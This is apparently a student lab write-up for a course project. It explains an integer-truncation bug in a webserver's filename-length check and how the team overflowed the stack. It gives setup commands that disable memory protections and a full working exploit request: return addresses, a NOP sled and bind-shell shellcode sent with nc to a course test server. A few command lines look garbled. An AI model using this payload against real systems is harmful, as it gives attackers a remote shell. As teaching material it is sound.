# p2 README

The vulnerability that we found in the webserver was in check_filename_length(byte len). This function strangely takes in a parameter of byte len. We then realized that the input to the function was an integer. Because the integer is 4 bytes and it is converted to a byte, only one byte is looked at in the check_filename_length function. This is a big vulnerability because the string can be valid with a large length if the last byte is less than 100. Because a byte is 2^8 bits, the totalByteSize%256 must be less than 100. Our attack was composed of 50 RA’s, 400 NOPs, and a shell code of 92 Bytes which resulted in a total of 792 Bytes. 792%256=24 which is less than 100 and therefore a valid string length. This string was created in the makeString.cc file. 

When we staged our attack on the remote server, we knew that all of the possible guessing addresses to hit our NOP sled had to be “above” 0xc0000000, since this was the maximum address space for the 32-bit architecture. We decided to increment by 500 bytes because the size of the shellcode plus our NOPs over 500, so we were confident that by moving “down” the stack by 500, we would eventually hit our NOP sled. We were very lucky, and hit the sled on our first guess, allowing us to exec a shell and edit the files in the server. The file that we created was called “hacked?” and “weHacked.txt”



The commands we utilized:



setarch `uname -m` -R /bin/bashv
gcc -m32 -z execstack -fno-stack-protector webserver.c -o webserver
echo -e "GET /index.html HTTP" | localhost 9000 
echo -e "GET /hacked? HTTP" | nc 310test.cs.duke.edu 9190
cat < hacked?	
	~’Text’



echo -e "GET /\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x0b\xfe\xff\xbf\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66\xcd\x80\x31\xd2\x52\x66\x68\x2b\x0d\x43\x66\x53\x89\xe1\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\x40\x89\x44\x24\x04\x43\x43\xb0\x66\xcd\x80\x83\xc4\x0c\x52\x52\x43\xb0\x66\xcd\x80\x93\x89\xd1\xb0\x3f\xcd\x80\x41\x80\xf9\x03\x75\xf6\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80.html HTTP" | nc 310test.cs.duke.edu 9190
